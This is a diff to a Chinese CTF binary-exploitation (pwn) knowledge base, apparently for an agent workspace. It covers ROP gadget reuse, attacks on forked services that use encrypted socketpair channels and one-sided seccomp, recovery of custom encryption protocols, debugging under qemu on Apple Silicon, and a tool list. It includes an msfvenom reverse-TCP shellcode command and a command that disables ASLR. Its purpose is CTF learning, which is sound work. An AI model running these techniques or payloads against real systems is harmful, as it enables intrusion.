+| **Apple Silicon Docker（qemu-user 模拟 amd64）中 gdb/strace 全部失真**（gdb 报 `linux_ptrace_test_ret_to_nx: PC (nil)`、strace 输出 syscall 号乱码不可读） | 这是 qemu-user 对 ptrace 仿真的固有限制，加 `--cap-add=SYS_PTRACE --security-opt seccomp=unconfined` 也救不了 gdb——立即放弃修工具，换观测手段: ① **标记输出二分定位**: 程序内找 `write(1, reg, imm)` 类片段（如 `mov edx,4; mov rsi,r12; mov edi,1; call _write`），ROP 链在不同位置插入该片段输出标记，按输出有无二分定位断链点; ② **ps 观察进程死活**: 父/子进程都活着但互相无响应 = 双边 read 阻塞死锁（如发送了对方解析不了的长度），一方消失 = 崩溃——两者的下一步排查方向完全不同。配套: **qemu-user 下 SROP（rt_sigreturn）仿真不可靠**——pop rax/rdi=15 + syscall 挂 sigreturnFrame 可能完全无效或行为异常，设计依赖 SROP 前先做一次最小验证（frame.rip 指向有可观察输出的指令），失败则优先换"函数片段复用"路线（见下"函数片段复用"小节） |
+| **fork 双进程 + socketpair 加密信道**（main 早期 `socketpair`+`fork`，父/子各 dup2 一端到 fd3，通信过 XOR 类函数、key 由 getpid LCG 派生存全局; 常见分工: 父进程交互命令行+seccomp 白名单，子进程持 flag fd+条目表无沙箱） | 审计四类攻击面: ① **窄类型截断溢出**——命令参数走 `strtol` 后截到 u8/u16 当 read 长度（截断值可能远大于意图上限）; ② **有符号索引检查**——`if (SLODWORD(idx) > N)` 放行负数，`基址 + 步长*idx` 回溯到条目表之前的敏感条目（flag fd 条目）: 用 `&pub_base + stride*(-k)` 反推目标 idx; ③ **单侧沙箱**——seccomp 只装在交互进程（受限侧 ROP 构造对无沙箱侧的合法协议请求即可越权）; ④ **正常接口发不出完整请求**——协议头里 len 字段被接口硬编码为 0 时，只能 ROP 直接 write(fd3, 完整包)。通信解密/构造见"自定义加密协议还原"小节，ROP 组件见下"函数片段复用"小节 |
+
+### 自定义加密协议还原（流量全加密的 pwn 服务）
+
+| 场景 | 方法 |
+|------|------|
+| 总体路线 | 逆握手而非逆全部: 服务端首包必含明文阶段（密钥尚未协商）——先发明文 nonce/challenge，客户端须回"自证"包（用已收 nonce 算校验值加密回传）。还原顺序: 明文包格式 → 密钥派生 → 加密原语 → 计数器语义; 全部可在本地离线对拍验证（实现客户端后先连本地实例过握手再打远程） |
+| 流密码形态识别 | 反编译里 `buf[i] ^= sbox[(key[i&0xF] + ctr + i) & 0xFF]` 是 counter 模式流密码——收发双向独立计数器（如 dword_rx/dword_tx 两个全局），每包累加**含 tag/命令字节的整包长**。"栈地址低字节自消"陷阱: index 计算常含 `-stack_low + cur_ptr_low`，两低字节相消后真实 index 只依赖 (key, ctr, i)——勿被表面地址运算迷惑 |
+| 密钥派生（轮函数） | 典型形态: key32 = server_nonce \|\| client_nonce，N 轮混合 `out[j] = rol8(key32[3r+j] ^ sbox[out[j] ^ key32[(j+8r)&0x1F]], 3)`（out 就地反馈、初值全 0、每轮输入窗口滑动）; S-box 从 .rodata dump 后校验双射性（`len(set(sbox))==256`）——非双射说明定位错了（那是数据不是表） |
+| 自证包（challenge） | 校验值通常由派生 key 直推，一对 sbox/移位组合: `expect[j] = sbox[key[j]] ^ key[(j+5)&0xF]` 类——逆出公式后客户端完整重实现握手+加密，与正常客户端等价交互。握手一次通过=协议还原正确的强验证 |
+
+### 函数片段复用（gadget 枯竭时的调用点复用）
+
+> 触发条件: pwntools `ROP.find_gadget` 扫不出 `pop rdx`/`pop rcx` 等关键 setter（小二进制常见），又无法 SROP（qemu-user 仿真 rt_sigreturn 不可靠，见 §4 卡点表）。解法: 把程序内**现成的指令片段**（函数内部从中间某地址进入的序列）当"多参数 gadget"用。
+
+**副作用表范式**——复用任何片段前必须列四列，缺一列都会踩坑:
+
+| 片段类型 | 识别形态 | 前置寄存器 | 副作用与出口 |
+|---------|---------|-----------|------------|
+| 定长输出 | `mov edx,4; mov rsi,r12; mov edi,1; call _write` | r12=地址 | 泄漏固定 4 字节; 出口常接 `jmp` 回读循环（输出后程序可能失控，用于一次性泄漏足够） |
+| 读循环 | `xor edi,edi; mov edx,1; mov rsi,r15; call _read` + 回边 | r15=缓冲地址, rbx=终点, rbp=命令串指针 | 逐字节写任意长度; 发 `\n` 退出后走**命令解析**——解析指针若取自寄存器（`mov r15, rbp`）则可控，预铺命令串实现漏洞函数重入（无限次新溢出段） |
+| pivot 读 | `xor edi,edi; movzx edx,bl; mov rsi,rsp; call _read` | rbx 低字节=长度, rsp=写目标 | **原始 read 无字节限制**（可写 0x00/0x0A）; 出口 `add rsp,0x40; pop rbx; ret` 跳到读数据 +0x48 处续链; 配合 `pop rsp` 片段可写任意已知地址 |
+| 协议发送 | `mov rcx,rbp; mov rsi,r14; rep movsq; ... call _write`(fd3) | r14=源, rbp=len | **内置加密副作用: 缓冲区必须放明文**（对端再解密）; 拷贝目标取 rsp+X（栈/已 pivot 的 BSS）; 出口 epilogue `add rsp,0x410; pop×5; ret`——续链槽 = 入口时 rsp+0x438，跨约 1KB 需在同一段可写区预铺 |
+| 协议接收 | `mov edx,N; mov rsi,rbx; mov edi,3; call _read` + 紧跟解密+校验+输出 | rbx=缓冲, **rsp=缓冲-偏移**（后续用 `[rsp+X]` 相对寻址校验响应头） | read→解密→检查→write(1) 输出一条龙; 用 `pop rsp` 把 rsp 设为 buf-偏移 即满足其寻址假设 |
+| 加密原语 | `mov edx, key全局; ... call 加密函数`（入口在 mov edx 之后几条内） | rdi/rsi 已 pop 设好 | 只能加密特定地址（其内部 `lea` 决定），通用性差——优先选上面的完整片段而非裸加密函数 |
+
+**两个致命陷阱**:
+- **双重加密死锁**: 发送片段内置加密时，若缓冲区放了预加密数据，对端解密得乱码——len 字段巨大 → 对端 read body 永久阻塞，本端 read 响应也阻塞。症状: `ps` 里两个进程都活着但互相无输出（区别于崩溃）。修复: 缓冲区放明文。
+- **LCG/pid 型 key 的恒定字节**: key 低 24 位由 pid 低 24 位决定，fork 型服务 pid 序号小 → 每次连接 key 仅最高字节变化、低 3 字节恒定。若利用链依赖"密文避开特定字节（如 0x0A 终止符）"的重试策略，恒定字节命中该值时**重试无穷次必失败**——重试 2-3 次失败后立即 dump 观测值序列找恒定模式，改走无字节限制的通道（pivot 读）而非继续重试。
 
 ## §5 工具链
 
-| 工具 | 用途 | 安装 | 关键用法 |
-|------|------|------|---------|
-| pwntools | exploit 框架 | `pip install pwntools` | `context.update(arch='amd64', os='linux')` / `remote()` / `process()` / `cyclic_find()` |
-| pwndbg | gdb 插件（堆查看） | `git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh` | `heap` / `tcache` / `vis_heap_chunks` / `io` / `tls` |
-| one_gadget | 找 libc one_gadget | `gem install one_gadget` | `one_gadget <libc.so>` |
-| ROPgadget | 找 ROP gadget | `pip install ROPgadget` | `ROPgadget --binary <binary> --re "pop rdi"` |
-| patchelf | 改 rpath/interpreter | `brew install patchelf` | `patchelf --set-interpreter <ld> --set-rpath <dir> <binary>` |
-| glibc-all-in-one | 下各版本 libc/ld | `git clone https://github.com/matrix1001/glibc-all-in-one` | `./update_list.sh` → `./download <id>` |
-| how2heap | 堆技术 PoC 库 | `git clone --recursive https://github.com/shellphish/how2heap` | 按 glibc 版本目录查找对应 PoC |
-| seccomp-tools | 分析 seccomp 规则 | `gem install seccomp-tools` | `seccomp-tools dump ./<binary>` |
-| LibcSearcher | 由偏移反查 libc | `git clone https://github.com/lieanu/LibcSearcher` | 或在线 libc.rip / libc.blukat.me |
-| angr | 符号执行/约束求解 | `pip install angr` | 详见 `$SHARED_DIR/knowledge-base/angr-exploration.md`（如已有） |
+> IDA（idat）既能静态分析也能动态调试，但它的调试器**只支持宿主机 CPU 架构**——arm64 Mac 上调不了 amd64 程序。动态调试统一用 `qemu-gdb`（自动适配 arm64/amd64，用法与普通 gdb 相同: `qemu-gdb ./pwn -ex "break main" -ex c`）; 需要堆插件时用 `gdb-pwndbg`（arm64）。
+> 注意区分两种 qemu 形态: `qemu-gdb ./binary`（宿主 qemu-user + gdbstub，调试**正常可用**）vs Docker `--platform linux/amd64` 容器**内部**跑 gdb/strace（对 qemu 模拟进程做 ptrace，失真不可用，替代手段见 §4 卡点表 qemu-user 条目）。需要完整 Linux 服务环境（多进程/socket 服务/glibc 特定行为）时用容器靶场（见下"本地靶场"），单进程调试优先宿主 qemu-gdb。
+
+**容器形态的符号级调试通道——容器内 qemu gdbstub + gdb remote**: 必须用容器（目录挂载 + stdin 管道驱动交互流程的本地复现场景）时，容器内直接跑 gdb（ptrace qemu 进程）不可用，但换 **gdbstub remote 协议**绕开 ptrace 即恢复正常:
+```bash
+# 容器内: qemu 自带 gdbstub 后台起目标（断在第一条指令前等待连接）
+qemu-x86_64 -g 1234 ./binary < input.txt > /dev/null 2>&1 &
+# 容器内另起 gdb，remote 协议连接（不走 ptrace，断点/读寄存器/finish 全部正常）
+gdb -q -batch -x dbg.gdb   # dbg.gdb 内含: file ./binary → target remote :1234 → 断点/commands
+```
+注意: 此通道**不需要** `--cap-add=SYS_PTRACE`（该参数救的是 ptrace 形态，对 gdbstub 无关）。
+**dbg 模板**（多函数断点静默打印 rbp，实测菜单环增量 / 校验栈布局）:
+```gdb
+set pagination off
+set confirm off
+file ./binary
+target remote :1234
+break <func1>
+commands 1
+silent
+printf "FUNC1 rbp=%p\n", $rbp
+c
+end
+break <func2>
+commands 2
+silent
+printf "FUNC2 rbp=%p\n", $rbp
+c
+end
+c
+quit
+```
+
+| 工具 | 用途 | 关键用法 |
+|------|------|---------|
+| pwntools | exploit 框架 | `context.update(arch='amd64', os='linux')` / `remote()` / `process()` / `cyclic_find()` |
+| gdb-pwndbg | 堆调试（arm64; heap/tcache 命令） | `heap` / `tcache` / `vis_heap_chunks` / `find_fake_fast &__malloc_hook`（找 hook 附近可伪造 chunk） |
+| one_gadget | 找 libc one_gadget | `one_gadget <libc.so>`（喂目标 libc 文件） |
+| ROPgadget | 找 ROP gadget | `ROPgadget --binary <binary> --re "pop rdi"`（ropper 同能力） |
+| patchelf | 改 rpath/interpreter | `patchelf --set-interpreter <ld> --set-rpath <dir> <binary>` |
+| glibc-all-in-one | 下各版本 libc/ld | `git clone --depth 1 https://github.com/matrix1001/glibc-all-in-one && cd glibc-all-in-one && ./update_list.sh` 后 `./download <id>`（数据源库，clone 到工作目录用） |
+| how2heap | 堆技术 PoC 库 | `git clone --recursive https://github.com/shellphish/how2heap`（按 glibc 版本目录查 PoC） |
+| seccomp-tools | 分析 seccomp 规则 | `seccomp-tools dump ./<binary>` |
+| libcsearcher | 由偏移反查 libc | `libcsearcher`（本地库）; 在线 libc.rip / libc.blukat.me |
+| angr | 符号执行/约束求解 | 详见 `$SHARED_DIR/knowledge-base/angr-symbolic-execution.md` |
 
 > pwndbg vs gef：二选一勿同时加载（命令冲突）。pwndbg 堆查看更强（默认首选），gef 多架构支持更好。
+> GEF 专有: `format-string-helper`/`heap-analysis-helper` 运行时自动检测漏洞; `pattern create N` + 溢出后 `i f` 读 saved rip + `pattern search <val>` 直得偏移; `canary` 搜 canary 值; `xinfo <addr>` 地址详情; `memory watch` 内存监视; `dump binary memory <file> <start> <end>`。
 
-**pwntools 调试模式**：
-```python
-context.terminal = ['tmux', 'splitw', '-h']  # 配合 gdb.attach
-p = process('./binary')
-gdb.attach(p, 'b *0x401234\nc')  # 设断点并继续
-p.interactive()
+**偏移的静态算法**（Ghidra）: 反编译局部变量名编码栈偏移——`local_bc` 即缓冲区偏移 0xbc; `local_10` 是 canary 时，缓冲区→canary 距离 = 两偏移差; 到 RIP = 缓冲区偏移 + 8(saved RBP) + 8。无需动态 cyclic 即可算，动态再验证一次更稳。
+
+**core dump 离线分析**: `ulimit -c unlimited` + `sysctl kernel.core_pattern=/tmp/core-%e.%p.%h.%t` → 崩溃后 `qemu-gdb --core=<core文件> ./binary` 永久保存现场分析偏移（远程不可交互/间歇崩溃场景）。**corefile API 自动偏移**: pwntools 对崩溃的 process 自动生成 core——`p.wait()` 后 `cyclic_find(p.corefile.read(p.corefile.sp, 4))`（x64 从 sp 读 saved RIP）/ `cyclic_find(p.corefile.pc)`（x86）直得偏移，免手动 GDB。
+
+**远程调试**: ① 目标机 `gdbserver --multi 0.0.0.0:23947 ./bin` + 本机 `target remote <ip>:23947`（跨架构 gdb-multiarch; qemu 用自带 gdbstub `-s -S`）② IDA 体系: 传 `linux_server64` 到目标 `-Ppass` 启动，IDA Debugger→linux remote 填 IP/密码。
+
+**shellcode 生成**: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=x LPORT=y -f python -b "\x00"`（-b 坏字符 -e 编码器 EXITFUNC=thread 防宿主退出）; 查 opcode 用 pwntools 的 `asm("nop")` 直接得字节; 手写 shellcode 用 `nasm -f elf64 sc.asm && ld sc.o` 编译，再 `objdump -d sc.o`（objdump 是 macOS 系统命令——在 /usr/bin/objdump，不在 $OPENSECURITY_HOME/bin，直接敲无需安装）提取机器码。
+
+**测试靶构造**: `gcc -fno-stack-protector -D_FORTIFY_SOURCE=0 -z norelro -z execstack -no-pie -g` 逐项关保护; 系统 ASLR: `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`。
+
+**pwntools 调试模式**：macOS 上无法用 `process('./binary')` 直接跑 amd64 ELF（arm64 系统），调试流程改为：
+1. `qemu-gdb ./binary -ex "break main" -ex c` 单独调试二进制（确定偏移/验证利用逻辑）
+2. pwntools 用 `remote('目标', 端口)` 打远程服务执行真实利用
+（gdb.attach 需要本机 gdb + 本机进程，仅 Linux 宿主可用）
+
+**本地靶场（Docker amd64）**: 目标是**多进程/socket 服务/依赖完整 Linux 运行时**（fork 型服务、seccomp 行为验证、要 strace 抓系统调用序列）时，宿主 qemu-gdb 单进程形态不够用，起容器靶场（服务端模板: `$SHARED_DIR/scripts/pwn_lab_server.py`，先 cp 进靶标目录一起挂载）:
+```bash
+cp "$SHARED_DIR/scripts/pwn_lab_server.py" .   # 与靶标二进制同目录
+# 靶标目录挂载到 /w，端口映射后主机 pwntools 直接 remote('127.0.0.1', 9999)
+docker run -d --name pwnlab --platform linux/amd64 -v "$PWD:/w" -w /w -p 9999:9999 ubuntu:24.04 sleep infinity
+docker exec -i pwnlab bash -c "apt-get update -qq && apt-get install -y -qq python3 strace"   # 一次性装依赖
+# 起每连接 fork 的 TCP 服务端（模拟远程 nc 环境; --strace 开启则每连接落一份 /tmp/trace_N.log）
+docker exec -d pwnlab bash -c "python3 /w/pwn_lab_server.py --port 9999 --binary /w/service"
 ```
+说明: 容器内 apt 装包约 20-30s（脚本/工具随装随用）; 需要容器内跑 gdb 时必须加 `--cap-add=SYS_PTRACE --security-opt seccomp=unconfined`，但 qemu-user 模拟下 gdb/strace 大概率仍失真（见 §4 卡点表），观测优先走标记输出而非修调试器。多端口靶场（本靶 + strace 靶并列）多映射一组 `-p` + 多起一个 server 实例即可。
 
 ## §6 关联文件
 
